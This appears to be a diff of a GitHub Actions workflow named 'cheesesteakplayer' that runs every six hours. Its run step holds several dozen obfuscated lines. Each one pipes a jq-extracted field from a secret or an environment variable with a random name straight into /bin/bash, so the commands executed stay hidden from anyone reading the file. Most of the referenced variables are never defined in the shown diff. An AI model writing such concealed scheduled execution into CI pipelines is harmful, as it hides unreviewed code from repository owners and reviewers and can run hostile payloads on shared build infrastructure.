@@ -2,8 +2,9 @@ name: cheesesteakplayer
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 0/6 * * *'
-jobs:  # 16911
+    - cron: '6 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +12,25 @@ jobs:  # 16911
       - uses: actions/checkout@v4
       - name: cheesesteakplayer
         env:
-          f7: ${{ secrets.f7 }}
+          p148: ${{ secrets.p148 }}
         run: |
-          echo $f7 | jq -r .xlcw3135 | /bin/bash
-          echo $l1 | jq -r .isl8 | /bin/bash
-          echo $kjhe09938 | jq -r .xn88 | /bin/bash
-          echo $ocp899 | jq -r .fvgns42 | /bin/bash
-          echo $cllvx4 | jq -r .vws1947 | /bin/bash
-          echo $idjy7678 | jq -r .yy65961 | /bin/bash
-          echo $e399 | jq -r .vdhws01 | /bin/bash
+          echo $p148 | jq -r .c30081 | /bin/bash
+          echo $keepr5 | jq -r .oxogj7 | /bin/bash
+          echo $qqsv0395 | jq -r .ieghm5 | /bin/bash
+          echo $jl333 | jq -r .woxl1 | /bin/bash
+          echo $olbo460 | jq -r .ao4659 | /bin/bash
+          echo $dz722 | jq -r .ht29259 | /bin/bash
+          echo $hzx97 | jq -r .fkk5 | /bin/bash
+          echo $rlyn6 | jq -r .b47683 | /bin/bash
+          echo $zwbve76 | jq -r .teqlp692 | /bin/bash
+          echo $n31 | jq -r .jeq612 | /bin/bash
+          echo $ifepw0947 | jq -r .xa82407 | /bin/bash
+          echo $fub1 | jq -r .cl2684 | /bin/bash
+          echo $rfnwe9 | jq -r .m64 | /bin/bash
+          echo $ln5 | jq -r .ypyjx1 | /bin/bash
+          echo $y596 | jq -r .ng06 | /bin/bash
+          echo $sws88 | jq -r .yx5221 | /bin/bash
+          echo $cgj2 | jq -r .mjdj1 | /bin/bash
+          echo $oyjmp73137 | jq -r .sliaz80173 | /bin/bash
+          echo $kezp3056 | jq -r .w063 | /bin/bash
 
